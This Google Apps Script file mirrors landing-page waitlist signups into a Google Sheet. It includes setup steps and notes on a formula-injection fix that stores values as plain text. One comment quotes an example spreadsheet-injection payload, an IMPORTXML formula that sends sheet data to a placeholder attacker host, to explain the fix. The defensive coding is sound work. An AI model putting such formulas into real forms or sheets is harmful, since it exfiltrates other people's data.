/**
 * lynxr — mirror landing-page waitlist signups into a Google Sheet.
 *
 * Sheet: https://docs.google.com/spreadsheets/d/1ypPfMkF6jpyQJ-9WCNoyjcjTenXrePhMz2uv96LjScY/
 *
 * SETUP (about two minutes, and it has to be you — it runs as your account):
 *   1. Open that sheet -> Extensions -> Apps Script.
 *   2. Delete whatever is there, paste this whole file, Save.
 *   3. Deploy -> New deployment -> type "Web app".
 *        Execute as:        Me
 *        Who has access:    Anyone
 *   4. Copy the /exec URL it gives you.
 *   5. Put that URL in WAITLIST_SHEET_URL at the top of home.js.
 *
 * If you ever redeploy with a NEW version, Apps Script issues a NEW /exec URL:
 * update home.js too, or signups keep reaching Supabase while the sheet
 * quietly stops filling. That failure is silent by design (see below), so it
 * will not announce itself.
 *
 * IF YOU ARE RE-DEPLOYING THIS FILE TO PATCH THE FORMULA-INJECTION FIX BELOW:
 * this is an OWNER action, the same as first setup — re-paste this whole
 * file into the existing Apps Script project, Deploy -> New deployment (a
 * new version, not "Manage deployments" -> edit), which issues a NEW /exec
 * URL. Put that new URL in WAITLIST_SHEET_URL in home.js and bump `?v=` on
 * all four pages, or the page keeps posting to the old (vulnerable) endpoint
 * while looking like nothing changed.
 *
 * WHY "Anyone": the landing page is a static public site and cannot hold a
 * Google credential — anything it ships is readable by everyone. An open
 * endpoint that only ever APPENDS is the safe shape here. Treat the sheet as
 * append-only and spammable.
 *
 * SUPABASE IS THE RECORD, this sheet is a convenience. Apps Script answers a
 * POST with a 302 the browser is not allowed to read, so the page sends with
 * mode:"no-cors" and cannot tell whether this succeeded. That is exactly why
 * the "You're on the list" message reflects the SUPABASE write, never this
 * one. If the two ever disagree, lynxr_waitlist is right.
 *
 * De-duplication happens in Supabase (email is the primary key), not here —
 * so a visitor who submits twice makes one table row but may make two sheet
 * rows. Dedupe on the email column if you export it.
 *
 * FORMULA INJECTION. `email` is anonymous, visitor-supplied text with no
 * shape enforced here (supabase/write_guards.sql adds a shape check on the
 * Supabase side, but this sheet is a separate write path and gets no benefit
 * from a Postgres constraint). A cell whose text begins `=`, `+`, `-` or `@`
 * is evaluated as a FORMULA the moment a human opens the sheet — a value
 * like `=IMPORTXML("https://attacker.example/x","//a")` can read other
 * cells in this sheet and send them to an attacker's URL, entirely through
 * the spreadsheet UI, no script involved. `setNumberFormat('@')` below pins
 * the destination range to plain text before the values land, which is what
 * stops that: a leading `=` is then just a character, never a formula.
 *
 * THE SAME CLASS OF BUG APPLIES TO ANY CSV EXPORT of this data opened in a
 * spreadsheet application (Excel, Numbers, Sheets' own importer) — see
 * HANDOFF.md's export instructions. Open with the import wizard's column
 * type forced to Text, or don't open a waitlist export in a spreadsheet at
 * all.
 */

var SHEET_ID = '1ypPfMkF6jpyQJ-9WCNoyjcjTenXrePhMz2uv96LjScY';
var HEADERS = ['when', 'email', 'source'];

function doPost(e) {
  try {
    var d = JSON.parse(e.postData.contents);
    var sheet = SpreadsheetApp.openById(SHEET_ID).getSheets()[0];

    // Write the header row once, so a fresh sheet is readable immediately.
    if (sheet.getLastRow() === 0) sheet.appendRow(HEADERS);

    // NOT appendRow: that leaves the cell format as "Automatic", which is
    // exactly what lets a leading `=`/`+`/`-`/`@` be read back as a formula.
    // Writing through a range whose number format is pinned to plain text
    // FIRST, then setting the values, is what keeps a visitor-supplied email
    // a string no matter what it starts with.
    var vals = [String(d.created_at || new Date().toISOString()),
                String(d.email || ''),
                String(d.source || 'landing')];
    var r = sheet.getRange(sheet.getLastRow() + 1, 1, 1, vals.length);
    r.setNumberFormat('@');   // plain text — a leading = is never a formula
    r.setValues([vals]);
    return ContentService.createTextOutput('ok');
  } catch (err) {
    // Never throw: the browser cannot read the response anyway (no-cors), and
    // the signup is already safe in Supabase.
    return ContentService.createTextOutput('error: ' + err);
  }
}

function doGet() {
  return ContentService.createTextOutput('lynxr waitlist endpoint — POST only');
}
